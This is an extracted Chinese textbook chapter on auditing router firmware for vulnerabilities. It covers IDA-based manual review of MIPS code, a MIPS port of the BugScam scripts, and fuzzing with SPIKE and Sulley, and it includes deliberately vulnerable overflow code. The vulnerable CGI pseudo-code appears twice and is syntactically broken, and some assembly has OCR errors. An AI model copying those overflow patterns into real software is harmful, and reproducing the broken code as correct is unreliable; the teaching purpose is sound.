模糊测试：是一种不依赖源代码的黑盒测试。使用模糊测试的方法可以发现那些在源码审计中无法发现的关键漏洞，也是目前普遍采用的黑盒测试方法。模糊测试通常是在某种形式的检测工具的辅助下进行的。模糊测试的目的是诱发程序的某个可观察的错误条件，如因模糊测试工具提供的输入数据而导致了一个无效的内存访问，调试器通常可以捕获所引发的错误，这些错误可以指引我们找出那些可利用的安全漏洞。

## 17.2 静态代码审计

在路由器漏洞挖掘中，由于系统的封闭性，所以基本上是得不到源代码的。但幸运的是，一些反汇编工具能够帮助我们将二进制代码转换为可读性更好的汇编代码，以便对代码进行汇编层次的审计。IDA 就是一款功能十分强大、可扩展性非常好的反汇编工具，特别是它能够支持嵌入式路由器系统普遍使用的 RISC 架构指令系统程序的反汇编。本节将介绍使用 IDA 进行人工审计及自动化漏洞审计工具的实现。

#### 17.2.1 人工代码审计

对于路由器二进制代码的人工审核工作，可能需要审核人员精通二进制、多种汇编语言、操作系统底层知识，这大大提高了代码审核的难度。人工分析从普遍意义上讲是一种灰盒分析技术，是指针对被分析目标程序进行代码分析，手工构造特殊输入条件，观察输出、目标状态变化等，从而获得漏洞的一种分析技术。输入包括有效的输入和无效的输入，输出包括正常输出和非正常输出。而非正常输出是漏洞出现的前提，或者就是目标程序的漏洞。非正常目标状态的变化也是发现漏洞的预兆，是我们进行漏洞挖掘时最希望看到的结果。

# 1. 人工代码审计的步骤

人工分析高度依赖分析人员的经验和技巧。那么，如何对路由器系统进行人工代码审计呢？进行人工代码审计的前提是已经通过 Binwalk 等工具从路由器固件中提取了被测试的目标

程序。通常可以按照以下步骤开展代码审计工作。

01 使用 IDA 对目标程序进行反汇编。

02 搜索可能造成安全漏洞的危险函数。

03 跟踪危险函数如何获取和处理用户提供的数据的过程，判断是否存在安全漏洞。

# 2. 可能造成安全漏洞的函数

通常情况下按照上面的步骤进行人工审计即可，其难点在于对目标程序进行反汇编，以及判断危险函数是否可能造成缓冲区溢出。幸运的是，反汇编的工作可以放心地交给 IDA 去做，我们只要集中精力解决另外两个问题就好了。首先看看有哪些函数可能造成安全漏洞。

这里简单地把这些危险函数分为两类，下面是其中的一些参考函数。

##### (1) 部分用户提供数据来源的相关函数

命令行参数：argv 操作。

环境变量：getenv()。

输入数据文件：read()、fscanf()、getc()、fgetc()、fgets()、vfscanf()。

键盘输入 /stdin: read()、scanf()、getchar()、gets()。

➢ 网络数据：read()、recv()、recvfrom()。

##### (2) 部分数据操作相关的危险函数

字符串复制：strcpy()、strncpy()。

命令执行：system()、execve() 系列。

字符串合并：`strcat()`。

格式化字符串：printf()、sprintf()。

在目标程序中，定位以上危险函数，然后根据危险函数参数个数、类型跟踪各参数，分析各缓冲区大小，判断是否存在安全漏洞。

# 3. 跟踪和分析方法

既然我们已经知道了哪些函数是可能造成安全漏洞的危险函数，接下来让我们看看定位了危险函数以后如何跟踪其参数列表。根据危险函数类别的不同，提供以下两种跟踪分析的方法。

正向数据流跟踪：适用于用户数据输入类型的危险函数跟踪。从用户输入点（用户数据输入函数）开始跟踪数据处理过程中数据会对程序逻辑造成何种影响，从而判断是否造成可利用的安全漏洞。

数据处理逆向流跟踪：适用于数据操作类型的危险函数跟踪。跟踪常见的数据操作危险函数，反向追踪函数参数的数据流向，找出源缓冲区和目的缓冲区，确定输入的数据是否会造成安全漏洞。

两种方法各有利弊。正向跟踪的流程稍显复杂、分支较多、跟踪难度大，但是覆盖全面，可以找到所有可能的安全漏洞。而逆向跟踪的数据构造较容易、流程比较确定，却容易遗漏洞、覆盖面不广。

下面以逆向跟踪方式检查 MIPS 汇编语言的一次 strcpy 调用为例，分析是否存在安全漏洞。

源码 MIPS 汇编语言 strcpy 检查

1 var_20 = -0x20
2 var_8 = -8
3 var_4 = -4
4 arg_0 = 0
5 arg_4 = 4
----snip----
6 lw $a0, 0x20+var_20($fp)
7 lui $v0, 0x41
8 addiu $a1, $v0, (code - 0x410000) # "just a test"
9 la $v0, strcpy
10 move $t9, $v0
11 bal strcpy
12 nop

首先定位到 strcpy 函数在程序中的某一次调用位置（如源码 1 的第 11 行），然后找到目的缓冲区。对第 6 行分析得知，目的缓冲区来自 var_20。分析第 1 行和第 2 行可知，var_20 为 24 字节。最后需要分析 strcpy 的源缓冲区。分析第 8 行可知，源缓冲区是一个字符串 “just a test”，大小为 12 字节。现在已经完整再现了 strcpy 函数，具体如下。

strcpy(var_20,"just a test");

目的缓冲区 var_20 为 24 字节，源缓冲区为 12 字节，因此这个 strcpy 函数是不可能造成缓冲区溢出的。

再看一个正向追踪的例子。

下面的伪代码片段来自一个真实的漏洞，如果只运用逆向跟踪数据流的方法，我们很可能会与该漏洞失之交臂。而运用正向追踪的方法，从用户数据提供危险函数 `getenv` 入手，跟踪 `CONTENT_LENGTH` 环境变量的值，则完全可以发现这个经典的安全漏洞。

揭秘家用路由器 0day 漏洞挖掘技术

#define WRITE VALUE 1
struct entries
{
    char name[36]; // POST parameter name
    char value[1025]; // POST parameter value
};
int content_length = 0;
char *content_length_str = getenv("CONTENT_LENGTH");
if (content_length_str)
{
    content_length = strtol(content_length_str, 10);
}
get_input_entries(struct entries *buf, int content_length)
{
    //post_data[] = "storage_path=AAAAA......"
    flag = WRITE_NAME;
    k = 0;
    count = 0;
    for (i = content_length; i > 0; i--)
    {
        if (post_data[i] == "="
        {
            // =
            flag = WRITE_VALUE;
            k = 0;
            continue;
        }
        else if (post_data[i] == "="
        {
            flag = WRITE_NAME;
            k = 0;
            count++;
            continue;
        }
    }
    if (flag == WRITE_NAME)
    {
        // name
        buf[count]->name[k] = post_data[i]; // vulnerable
        else if (flag == WRITE_VALUE)
        {
            // value
            buf[count]->value[k] = post_data[i]; // vulnerable
        }
    }
}

#define WRITE_VALUE 1

#define entries
{
    char name[36]; // POST parameter name
    char value[1025]; // POST parameter value
};
int content_length = 0;
char *content_length_str = getenv("CONTENT_LENGTH");
if (content_length_str)
{
    content_length = strtol(content_length_str, 10);
}
get_input_entries(struct entries *buf, int content_length)
{
    k = 0;
    count = 0;
    for (i = content_length; i > 0; i--)
    {
        if (post_data[i] == "="
        {
            flag = WRITE_VALUE;
            k = 0;
            continue;
        }
        else if (post_data[i] == "="
        {
            flag = WRITE_NAME;
            k = 0;
            count++;
            continue;
        }
    }
    if (flag == WRITE_NAME)
    {
        // name
        buf[count]->name[k] = post_data[i]; // vulnerable
        else if (flag == WRITE_VALUE)
        {
            // value
            buf[count]->value[k] = post_data[i]; // vulnerable
        }
    }
}

45 if(count < 0x425)
46 return ;
47 }

从以上代码中可以看出，在漏洞函数 `get_input_entries` 中并没有使用之前讲到的任何危险函数，而是采用了循环赋值操作，在循环赋值的过程中边界判断出现了问题，从而导致了缓冲区溢出。

人工代码审计存在高度依赖分析人员的经验和技巧、分析人员对目标的汇编语言熟练程度，以及代码阅读量大等显而易见的缺点，所以在对大型软件的分析中难度巨大。为了减小人工代码审计的复杂度，需要引入二进制代码自动化审计的概念，并根据人工代码审计的方法和经验定制自动化的审计工具。

#### 17.2.2 二进制自动化漏洞审计

要想实现对二进制文件潜在漏洞审计的自动化，必须理解二进制文件是哪一种可执行文件格式，理解其使用的机器语言指令，并且能够通过对指令流和数据流的分析确定指令所执行的动作是否可以被利用。针对二进制文件的漏洞审计工具，需要让它们能够解释可执行文件的格式，识别机器语言，并将其转换为可读性更好的汇编语言以方便审计。这是一个相当困难的过程，幸运的是，我们并不需要做这种“重复制造轮子”的工作，有很多反汇编工具能够很好地支持这些特性。

二进制文件漏洞自动化审计工具的主要难题集中在如何准确地描述导致漏洞条件的行为特征上，这类行为包括越界访问分配的内存（栈或堆内存）、使用未初始化的变量或直接将用户输入传给危险函数。要想完成这些任务中的任何一个，自动化分析工具都必须能够精确计算索引变量或指针的值的范围，追踪程序使用的用户输入值的处理流程，并跟踪程序引用的所有变量的初始化代码。最后，为了做到真正有效，自动化的漏洞审计工具在处理程序员和编译器所使用的众多不同算法实现的同时，还必须能够可靠地执行以上所有任务。简而言之，要实现一款非常可靠的二进制漏洞自动化审计工具，难度相当大。

BugScam 是这一领域的早期探路者，它是 Halvar Flake 编写的一组用于 IDA Pro 的脚本。IDA Pro 具有两个异常强大的功能，即脚本编程和插件架构。这两个功能都可以让用户扩展 IDA Pro 的功能，并利用 IDA Pro 对目标二进制代码进行大量分析。与代码审计工具类似，BugScam 扫描那些往往会导致可被利用漏洞条件的潜在不安全函数。但它与大多数代码工具的不同之处在于，BugScam 会尝试执行一些初步的数据流分析，以便更准确地判断这些不安全函数是否真的可以被利用。BugScam 会在扫描完成后生产一份 HTML 报告，其中包含了每一个潜在问

题所处的虚拟地址，以及扫描发现的问题。因为这些脚本在 IDA Pro 中运行，所以能够相对容易地列出每个问题点以提供进一步的分析和帮助，从而确定这些被函数调用是否真的可以被利用。IDA Pro 能够识别大量的可执行文件格式及机器语言，而 BugScam 脚本正是利用了 IDA Pro 的这一强大的分析功能。

BugScam 是一个轻量级的漏洞分析工具，它在 x86 平台上的运行效果还是不错的，但是存在一定的局限性。因为该工具的指令集定位在 x86 平台，所以不能审计 MIPS 指令系统的应用程序，而且误报率和漏报率还是稍微高了一点。但是，BugScam 利用了 IDA Pro 强大的反汇编能力，通过 IDA Pro 强大的脚本功能进行二进制文件漏洞自动化审计的思路是非常值得借鉴的，因此，通过对 BugScam 的整体架构进行简单分析后，可以将 BugScam 移植到 MIPS 指令系统中。关于 IDA Pro 和 IDC 脚本机制的背景知识本书就不介绍了，读者可以参考 IDA Pro 的在线帮助文档及《IDA Pro 权威指南》一书。

#### 17.2.3 定制审计工具R-BugScam

BugScam 是一个基于 IDA Pro 的轻量级 x86 指令集漏洞分析工具，可以检测出一些比较简单的编程错误。因为 BugScam 是一个依赖反汇编技术的工具，因此也决定了 BugScam 在进行二进制分析时会存在很大的困难，其中导致 BugScam 效率不高的原因主要有两个，分别是无法精确得到缓冲区长度和误报。但是，笔者觉得这种工具仍然是不可或缺的，虽然它的能力限于检查简单模式的漏洞，却可以有效降低重复的体力劳动。在具体的分析过程中，使用 BugScam 进行扫描能够排除大量根本不可能有问题的函数调用，如果足够幸运的话，可能会找到漏洞。

RISC 指令集体系结构在路由器中很常见，主要包含 ARM、MIPS。BugScam 只支持 x86 指令集的二进制漏洞审计工具，不支持 RISC 指令集。但是，BugScam 在二进制漏洞审计方面的思路还是值得借鉴的。因此，本节将对 BugScam 的一些实现机制进行简单的分析，并使 BugScam 可以对 RISC 指令集程序进行漏洞审计。

# 1. BugScam文件组织结构

在 BugScam 中，我们需要关注的脚本文件及目录如下。

//libaduit.idc: 数据流分析脚本。

➢ /run_analysis.idc: 启动分析脚本。这是分析的入口。

/bugscam.conf: 不安全函数处理脚本配置列表。

➢ /analysis_scripts/: 存放各种不安全函数处理脚本。

➢ /reports/：存放应用程序安全漏洞扫描报告。

# 2. 检查模式

BugScam 采用与源码审计工具相似的检查模式，针对可能导致缓冲区溢出的库函数进行参数检查，以确定程序中是否存在安全隐患。

# 3. 缓冲区溢出检查

常见的缓冲区溢出检查有字符串复制和格式化字符串函数两种模式。

字符串复制模式示例如下。

strcpy (dst, src);

BugScam 判断的算法很简单：如果 dst 缓冲区的长度小于 src 缓冲区的长度，就认为有缓冲区溢出的可能性。这里只能判断缓冲区是否存在溢出的可能，要想准确判断漏洞是否可以利用则是另一个问题。在 BugScam 中并没有着手深入解决这个问题，毕竟它只是一个轻量级的二进制漏洞审计工具。

格式化字符串函数模式在程序中使用广泛，出现的漏洞也很多，示例如下。

sprintf (dst, "place:%s%d", src, data);

这个漏洞判断的算法是 `sizeof(data+src)` 的值小于 `sizeof(dst)`。当然，按照这个算法，可能会有一些小的误差，因为 `sprintf` 格式化字符串中的字符 “place:” 所占的长度是没有计算在内的。

# 4. 数据流分析

BugScam 对数据流的分析实际上是在确定缓冲区的长度。在 BugScam 项目中，libaudit.idc 脚本根据缓冲区所处的不同位置，提供了几个不同的确定缓冲区长度的方法，具体如下。

1 static GetArgBufSize(eaCall, iArgnum);
2 static StckBuffSize(lpCall, cName);
3 static StrucBuffSize(strucID, cName);
4 static SHeapBuffSize(eaBuff);

以上功能都是基于如下核心函数。

static BuffSize(eaInstruc, iOpnum);

在 x86 代码审计下 BugScam 进行数据流处理的流程如图 17-1 所示。

前面介绍了 BugScam 的整体审计框架，接下来我们要使用 BugScam 实现 MIPS 指令系统的二进制审计，其中最关键的一点是数据流的分析。

##### 揭秘家用路由器 0day 漏洞挖掘技术

 </div>

对 MIPS 指令系统下数据流分析中的几个关键点简要分析如下。

##### (1) 如何确定函数参数

在确定函数参数之前，我们需要重温一下在 MIPS 指令中函数调用时参数的传递方法。

在 MIPS 汇编中，函数调用需要通过 4 个寄存器传递参数，如果参数超过 4 个，那么多余的参数将被放入堆栈中。

接下来，我们看一下参数个数少于 4 个的函数调用。这里以 strcpy(dst,src) 函数调用为例，在 MIPS 汇编指令中调用的情况如下。

1 la $t9, strcpy
2 law $a0, 0x580+dst($sp)
3 law $a1, 0x580+src($sp)
4 jalr $t9 ;strcpy

第 2 行：将位于堆栈的目的缓冲区 dst 的地址作为 strcpy 的第 1 个参数赋给 $a0。

第 3 行：将堆栈上的源缓冲区 src 的地址作为 strcpy 的第 2 个参数赋给 $a1。

那么，超过 4 个参数时，MIPS 汇编是如何进行组织的呢？这种情况在 sprintf 字符串格式化函数中会经常遇到。C 语言格式的 spritnf 调用如下。

sprintf(dest,"%dAction%d%s",src1,src2,"/var/run");
可以看到，上面的 sprintf 共有 5 个参数。MIPS 汇编中 sprintf 的调用如下。

##### 源码 2 sprintf 的 MIPS 汇编

1 la $t9,sprintf
2 lw $a0,0x58+dst($sp)
3 la $a1,aDActionDS #"dAction%d%s"
4 lw $a2,0x58+src1($sp)
5 lw $a3,0x58+src2($sp)
6 la $v1,aVarRun #"/var/run"
7 jalr $t9 ;sprintf
8 sw $v1,0x58+var_48

第 2 行～第 5 行：分别将 sprintf 的前 4 个参数存入 \$a0、\$a1、\$a2、\$a2 寄存器中。

第 8 行：将第 5 个参数 “/var/run” 的首地址存入堆栈。

前面已经分析了 MIPS 汇编是如何进行参数传递的，现在我们需要对危险函数进行扫描。应该如何找出所有的参数呢？不得不提到 MIPS 的流水线效应——由于采用了高度的流水线，会产生几条指令同时执行，即在任何一个分支跳转语句后面的语句和分支跳转同时执行。例如，源码 2 中第 7 行和第 8 行是同时执行的。

因此，在寻找一个函数的参数时，需要先搜索危险函数跳转位置（如源码 2 第 7 行）后的一条语句，然后向前继续搜索其他参数。

##### (2) 反向数据追踪

正向数据追踪试图从数据起始处开始一直跟踪到数据的使用位置。令人遗憾的是，在任何情况下，对条件语句和循环语句中的数据留待进行静态分析都是一个难题，因此，R-BugScam采用反向数据追踪，先找到危险函数，然后搜索危险函数参数，反向追踪参数的数据来源。

反向数据追踪也是相当复杂的。因为数据可能会在多层函数间传递、处理并经过多次寄存器传递，所以这会让反向追踪的难度大大增加。下面就可能遇到的情况进行举例。

##### 源码 3 main() 函数

1 lw $gp, 0x30+var_20($fp)
2 addiu $v0, $fp, 0x30+var_18
3 move $a0, $v0
4 jal vulnerable
5 nop

##### 源码 4 vulnerable 函数

1  lw    $gp, 0x90+var_80($fp)
2  addiu    $v0, $fp, 0x90+var_14

3 1w $a0, 0x90+arg_0($fp)
4 move $al, $v0
5 la $v0, strcpy
6 move $t9, $v0
7 bal strcpy
8 nop

试着寻找第一个参数。首先找到源码 4 中第 7 行的危险函数跳转地址。从这里向下，找到第 8 行，发现这里没有与第 1 个参数 a0 相关的指令。接下来，向上搜索，在第 3 行看到第 1 个参数来源于  $ 0x90+\arg_0(\fp) $。到这里，对第 1 个参数的追踪还不能结束，因为这里的“ $ 0x90+\arg_0(\fp) $”来源于上层函数，所以需要前往上层函数执行与刚才相同的方法进行搜索，直至找到这个缓冲区或者分配函数等为止。继续搜索上层的 main() 函数（源码 3），现在问题变成了要搜索 vulnerable 函数的第 1 个参数。因此，在源码 3 中找到第 4 行跳转地址，在第 3 行中可知 a0 来自 v0，继续搜索会发现 strcpy 的第 1 个参数其实来源于 main() 函数的堆栈临时变量  $ 0x30+\text{var}_{18} $。至此，第 1 个参数才算是找到了。

接下来寻找第 2 个参数 $a1。同样从源码 4 漏洞函数的第 7 行向下搜索，没有发现 $a1 的相关指令。向上搜索，在第 4 行找到 $a1 来自寄存器 $v0。在这里，仅仅希望通过寻找是谁与 $a1 有数据传递而找到缓冲区是行不通的，接下来就需要搜索 $v0 的来源。继续向上搜索，在第 2 行发现 $v0 其实来自堆栈变量 0x90+var_14。至此就找到了 strcpy 的第 2 个参数。

上面的例子其实就是 R-BugScam 定位函数缓冲区的一种情况，R-BugScam 的实现也就是将上面的搜索方法转化为 IDC 脚本而已。另外，在搜索参数时，在将最终的缓冲区的地址作为参数传递到 strcpy 的过程中，该缓冲区可以说是“一波三折”，经过了多个寄存器、函数的传递。因此，并不是回溯到 $a0、$a1、$a2、$a3 等参数寄存器就可以找到最终的缓冲区，有时是需要递归回溯的。

定位了函数参数，经过反向追踪数据确定了缓冲区的位置之后，就完成了最后一个重要的步骤——分析参数所在缓冲区的大小，通过分析缓冲区大小判断当前的危险函数是否存在缓冲区溢出可能性。确定缓冲区的大小时通常会遇到如下两种情况。

参数在堆栈上。

参数来自堆、其他函数返回或者全局字符。

如果参数来自堆栈，那么通过 IDA 提供的函数就可以确定缓冲区的大小。在 R-BugScam 源码中，StckBuffSize 和 StrucBuffSize 可以找到确定缓冲区大小的实现代码。而对参数来自堆、函数返回、全局字符的情况，分析起来困难比较大，因此采取直接返回“不确定的缓冲区大小”的方法，将其报告给分析人员，然后通过人工方式判断。

# 5. 误报分析

通过前面的分析可以看出，R-BugScam 扫描的确偏轻量级了一点。但是不得不承认，R-BugScam 对提高分析效率、降低分析代码量方面还是有很大帮助的。接下来我们还是了解一下，为什么说 R-BugScam 是轻量级的扫描工具，其误报都发生在哪些地方呢？

R-BugScam 在缓冲区大小的确定方法上存在缺陷，如下面代码的处理。

char *pStructure = "I am a structure";
char *pSub = pStructure + 7; // "structure"

因为 pStructure 和 pStructure+7 都是一个引用的地址，而这样判断出来的缓冲区就会被分解成一个长度为 4 和一个长度为 “strlen("I am a structure") - 7” 的缓冲区，所以，R-BugScam 生成的报告里如果出现长度为 10 以内（如 2、3、4 等）的缓冲区，很大一部分都属于误报。

还有一种情况就是无法确定缓冲区的长度，其原因是之前介绍的缓冲区位于堆或者来自函数的返回等来源确定难度大的情况下，在 R-BugScam 实现时就直接返回 “缓冲区长度无法确定”，转由分析人员进行判断。

R-BugScam 的误报还存在一个根本缺陷，即只能确定源缓冲区与目的缓冲区在大小上是否存在产生缓冲区溢出的可能性，但是不能完全断定是否存在缓冲区溢出，可能的情况如下。

##### 源码 5 误报

1 char src[255]="localstring";
2 char dst[100]={0};
3 strcpy(dst,src);

按照 R-BugScam 的扫描逻辑，如果源参数缓冲区 src 长度为 255 字节，大于目的缓冲区 dst 的长度 100 字节，就可以判定存在缓冲区溢出。但是仅从源码 5 来看，危险函数 strcpy 是不存在溢出漏洞的，因为缓冲区 src 的实际长度只有 12 字节而已（包含 “NULL”）。下面是 R-BugScam 对该漏洞的扫描结论。

The maximum possible size of the target buffer (100) is smaller than the minimum possible size of the source buffer (256). This is VERY likely to be a buffer overrun!

导致误报的原因还可能是 R-BugScam 进行静态分析没有运行时的信息，所以无法定位 src 的实际大小。但是，结论指出这里是很像一个缓冲区溢出，还是比较准确的。

虽然 R-BugScam 存在一定的误报，但是毕竟没有一款工具是完全没有缺陷的，而且在使用静态二进制审计工具的过程中，我们慢慢就会发现逆向工程程序的算法。对于分析工具来

说，在有源码的情况下进行审计和分析都很困难，更不要说汇编了。接下来我们分析一下 R-BugScam 静态扫描的难点。

# 6. 难点分析

其实，普通的程序使用 R-BugScam 进行安全检查在理论上是可以发现不少问题的，但是在实际运行过程中，R-BugScam 输出的报告中的大部分信息都是无用的。在源码级别的安全审计中很难解决准确检查缓冲区长度和误报的问题，更何况是在汇编级别的安全审计中。因此，精确确定缓冲区长度是 R-BugScam 最大的难点。

需要注意的是，任何自动化工具都不能代替有经验的安全研究员的经验。工具只不过是将繁重的代码检查工作简化，帮助分析人员节约时间。但是，工具生成的报告仍然需要有经验的分析人员进行审核，找出那些真正的安全漏洞。

# 7. R-BugScam测试

将修改以后的 R-BugScam 复制到 IDA 目录的 idc 文件夹下。因为 R-BugScam 需要读取审计配置文件，所以在 R-BugScam 中使用了绝对路径。我们可能需要按照 README.TXT 修改其中的绝对路径。

在本书的下载链接中提供了一些经过 MIPS 编译器编译的程序。

测试 test.c 的源码如下。

##### 源码 6 test.c

int vulnerable(char *dst, char *src)
{
    strcpy(dst, src);
    return 1;
}
void main()
{
    char dst[10];
    char test[100] = {0};
    memset(dst, 0, 10);
    vulnerable(dst, test);
}

启动 IDA，加载被测试 MIPS 程序 test，使用快捷键 “Alt+F7” 找到 R-BugScam 目录下的 run_analysis.idc 并运行，如图 17-2 所示。

 </div>

查看审计报告，报告位于 R-BugScam/reports/test.html，审计结果如图 17-3 所示。

 </div>

 </div>

从源码和审计结果可以看出，运行 test 程序是不会造成缓冲区溢出的，但是 R-BugScam 对 test 的审计结果非常像一个缓冲区溢出复写漏洞，这一结论也是没有错误的。

## 17.3 模糊测试 Fuzzing

模糊测试（Fuzz Testing）的理论和应用目前都已成熟，已有各种 Fuzz 安全测试的框架、工具和书籍问世。在信息安全领域，很多安全测试都引入了 Fuzz Testing 思想进行安全漏洞挖掘。

#### 17.3.1 模糊测试简介

模糊测试是一种介于完全的手工渗透测试与完全的自动化测试之间的安全性黑盒测试类型。它充分利用了机器的能力：随机生成和发送数据，同时尝试将安全专家在安全性方面的经验引入。从执行过程的角度来说，模糊测试的执行过程非常简单，大致可以分为如下5个阶段。

# 1. 确定输入向量

几乎所有可以被攻击者利用的安全漏洞都是因为应用程序没有对用户输入进行安全的边界校验，或者对非法输入有过滤但并不完全造成的。能否实施有效的模糊测试，关键在于能否准确地找到输入向量。我们将确定输入向量的原则定义为：一切向测试目标程序输入的数据都应该被认为是危险的，所有输入向量都可能是存在潜在安全风险的模糊测试变量。

# 2. 生成模糊测试数据

识别所有的输入向量之后，就可以依据输入向量产生模糊测试数据。产生模糊测试数据的方式主要有两种：一种是通过预先确定的值，使用基于已存在的数据通过算法将其变异，生成新的测试数据；另一种是通过分析被测试应用程序及其使用的数据格式，动态生成测试数据。无论选择哪一种方式，都应该使模糊测试数据的生成自动化，否则将大大降低测试效率。

# 3. 执行模糊测试

在完成前面两个步骤以后，就可以执行模糊测试了。在这一步中，需要依据测试目标的不同选择不同的测试方法，一般会向被测试目标发送数据包、利用被测试程序打开包含测试数据的文件等。与生成模糊测试数据一样，执行模糊测试同样需要实现自动化。

# 4. 监视异常

在进行模糊测试的过程中，一个非常重要的步骤就是对测试过程中的异常和错误进行监控。模糊测试的目的不仅是希望确定被测试程序是否有安全漏洞，更重要的是确定程序为何会

产生异常，以及产生异常后对漏洞进行重现，从而使安全专家可以针对漏洞编写测试代码，以确定漏洞的存在，同时，厂商可以对漏洞进行及时的修补。

# 5. 根据被测系统的状态判断是否存在潜在的安全漏洞

如果在模糊测试中发现了一个程序错误，依据我们的审计目的，需要判断这个程序错误是一个可利用的安全漏洞还是程序 Bug。

显然，模糊测试的整个执行过程是需要依靠工具进行的自动化测试——如此大规模的数据和分析完全依靠手工是不现实的。那么，为什么模糊测试需要和安全专家的经验结合起来呢？我们用一个例子演示一下。

为了简单起见，假定我们要测试的应用是一个 C/S 应用的服务端程序。这个程序运行在 Linux 平台上，叫做 WPServer。我们唯一知道的信息就是客户端和 WPServer 之间使用基于 TCP/IP 的自定义协议进行通信。在这种情况下，我们该如何尝试找到应用系统中可能存在的漏洞呢？有如下两种方法。

第一种方法是：如果我们手头上有 WPServer 的源码，通过代码审计显然可以找到可能的漏洞。如果没有源码，我们依然可以通过逆向工程的方式用代码审计找到漏洞。当然，这必然要求审查者具有足够好的技能，而且，被测应用规模越大，需要付出的成本越高。

第二种方法是：尝试抓取客户端和服务器之间的通信数据，根据这些数据分析客户端与服务器之间的通信协议，然后根据协议的定义手工构造协议数据，对 WPServer 发起攻击，尝试找到可能的漏洞。

在以上两种方法中，第二种方法在成本上显然要比第一种低，而且由于第二种方法关注的是协议层面的攻击，所以效率会更高。但是，仔细思考一下，第二种方法还是存在一些问题：完整的协议分析难度大，很难遍历所有的输入路径；人工编造、变异协议数据的成本很高。

在第二种方法的基础上，我们尝试引入模糊测试的概念。由于机器生成和发送数据的能力足够强，因此我们完全可以把生成数据的任务交给机器去完成。当然，协议的分析主要还是依赖人工完成。虽然模糊测试领域内有一些自动化的协议分析手段，但从效率和效果上来说，在面对复杂协议的时候，人工分析的方式更为有效、稳妥。

简单地说，模糊测试尝试降低安全性测试的门槛，通过半随机方式的数据发送找出被测系统的漏洞。显然，测试者对被测应用越了解，测试者的技能越娴熟，模糊测试数据的生成就越准确。但与代码审计相比，模糊测试显然更容易进行。而且，通过自动化工具，模糊测试可以把安全方面的经验积累到工具中，为组织持续的安全性测试提供帮助。接下来就介绍几款模糊测试利器。

### 17.3.2 SPIKE

SPIKE 是一款非常著名的 Protocol Fuzz（针对网络协议的模糊测试）工具，也是一款完全开源的免费工具。SPIKE 的作者是 Immunity 公司的创始人 Dave Aitel。

SPIKE 最著名的特性就是引入了基于数据块的 Fuzz 理论。作为出色的漏洞挖掘专家，Dave Aitel 非常清楚我们前面介绍的这种数据内部之间的制约关系——如果增加某个数据域的长度，很可能需要同时修改另一个指示这个数据域的长度的标志位。如果忽略这个数据的内部制约关系，Fuzz 测试就变得盲目、低效，很难发现真正的漏洞。

SPIKE 虽然是一款优秀的模糊测试工具，但官方并没有提供 SPIKE 的使用文档，这几乎是致命的。但幸运的是，我们可以根据各种参考资料和一些测试脚本整理 SPIKE 常用的 API 的使用方法。下面列出的 API 可能无法让我们开发一款模糊测试工具，但足以帮助我们创建 SPIKE 测试脚本，完成基本的模糊测试。

》字符串原语，示例如下。

s_cstring("abc") //添加C类型（以“NULL”结尾）的字符串
s_unstring("str") //添加Unicode类型的字符串
s_xdr_string("str") //添加xdr类型的字符串，即包含4字节长度标签，并用“0”扩展4倍长度，在测试中不变异
s_string("str") //添加静态字符串，值在测试中不变异
s_string_variable("abc") //添加字符串变量
s_unstring_variable(unsigned char *variable) //添加Unicode类型的字符串变量
s_string_repeat("str",200) //“str”字符串变异200次
s_add_fuzzstring(unsigned char *newfuzzstr) //添加自定义畸形字符串
s_init_fuzzing() //使用SPIKE自带的畸形数据库
二进制数据原语，示例如下。
s_binary("4142 0x41 \x41") //添加二进制数据
s_binary_repeat("\x41",200) //连续添加200个0x41
整型数据原语，示例如下。
s_int_variable(int defaultvalue, int type) //添加整数类型变量
s_add_fuzzint(unsigned long fuzzing) //添加自定义类型的畸形整数值
块处理原语，示例如下。
s_block_start("block1") //定义块block1的起始位置

2 s_block_end("block1") //定义块block1的结束位置
3 s_blocksize_string("block1",2); //添加2个字符长度来表示block1的大小
4 s_binary_block_size_intel_word("block1") //获取4字节长度的block1长度占位符
(little-endian)
5 s_binary_block_size_byte("block1") //添加1字节来表示block1的大小
用法举例如下。
s_string("ABC");
s_block_start("block1");
s_string_variable("123");
s_block_end("block1");
运行结果如下。
ABC123
ABC124
---snip---
ABCAAAAAAAA

进行模糊测试时，每次变化的量是 “123”， 前面的 “ABC” 是固定不变的。

#### 17.3.3 Sulley

Sulley 的作者是 Pedram Amini，著名的 PaiMei 也是由他编写的。Sulley 是一款灵活而且非常强大的模糊测试工具。基于 Dave Aitel 的模块化模糊测试方法，也就是上面介绍的 SPIKE 模糊测试工具，Sulley 将模糊测试数据组织成一些请求。当然，我们可以拥有多个请求并把它们组织成所谓的会话。

发起一个请求的函数 s_initialize，其唯一参数是请求的名字，示例如下。

s_initialize("new request");

初始化以后，即可添加原语构建模糊测试数据。

# 1. 静态数据

静态数据是指在模糊测试执行的过程中函数提供的值恒定不变，是不会变异的数据，示例如下。

s_static("hello sulley")
s_dunno("hello sulley")

s_unknown("hello sulley")
s_raw("hello sulley")

# 2. 二进制数据

在 Sulley 模糊测试器中，使用 s_binary 原语可以很方便地以各种格式表示二进制的值，语法如下。

s_binary("default value", <name>, <fuzzable>, <num_mutations>) ;

用法实例如下。

s_binary("x41 0x41 0x4142 43 44\x0a", name="sulley");

# 3. 字符串和分隔符

在很多协议中都能找到字符串的身影。Sulley 提供了 s_string() 原语进行字符串测试，其语法如下。

s_string("default value", <name>, <fuzzable>, <encoding>, <padding>, <size>) ;

size: 整型，默认值为 -1。

padding: 默认值为 “\x00”。如果指定了 size 的值，而生成的字符串小于 size，将使用 padding 指定的字符串填充。

encoding：默认值为“ascii”，生成字符串使用的编码，有效编码为 Python 定义的 str.encode() 例程指定的类型，如 “utf_16_le”。

fuzzable: 默认值为 “True”，用于启用或禁用字符串变异。

name: 默认值为 “None”，用于给 Sulley 句柄指定一个名字。

用法举例如下。

#fuzzes the string: <BODY bgcolor="black">
s_delim("<")
s_string("BODY")
s_delim(" ")
s_string("bgcolor")
s_delim("=")
s_delim("\\")
s_string("black")
s_delim("\\")
s_delim(">")

# 4. 整数

可以向整数发出请求，并通过 s_byte() 函数进行测试，函数语法如下。

1 byte: s_byte(), s_char()。
2 bytes: s_word(), s_short()。
4 bytes: s_dword(), s_long(), s_int()。
8 bytes: s_qword(), s_double()。

每个整数类型都必须接受至少一个默认整数类型的值作为参数，额外的参数如下。

》endian: 默认小端机格式。

format: 整数的输出格式，默认以二进制格式输出，可以选择二进制格式或者 ASCII 方式。

signed: 该选项仅在 format 选项为 ASCII 模式时有效，使输出为有符号或无符号数，默认为无符号数。

full_range: 如果启用该选项，原语在对数据变异时将采用所有可能的值，默认为禁用。

